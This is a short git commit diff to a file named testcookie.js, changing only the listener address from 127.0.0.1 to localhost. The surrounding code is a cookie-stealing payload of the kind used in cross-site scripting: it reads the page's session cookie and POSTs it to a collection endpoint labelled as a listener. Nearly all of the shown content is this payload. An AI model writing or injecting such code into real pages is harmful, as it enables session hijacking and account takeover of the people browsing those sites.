aa584e678b634ecc668ac4817e47a05fe8277b5a
zer0p0int <81251950+zer0p0intvvv@users.noreply.github.com>
2024-05-06 15:25:16 +0800

    Update testcookie.js

--- testcookie.js
+++ testcookie.js
@@ -1,6 +1,6 @@
 var sessionid = document.cookie.split('=')[1]+".";
 
-fetch('http://127.0.0.1:7745/send', {
+fetch('http://localhost:7745/send', {
   method: 'POST',
   body: 'header=fdsafdsa&listener=admin123321&content='+sessionid,
   headers: {
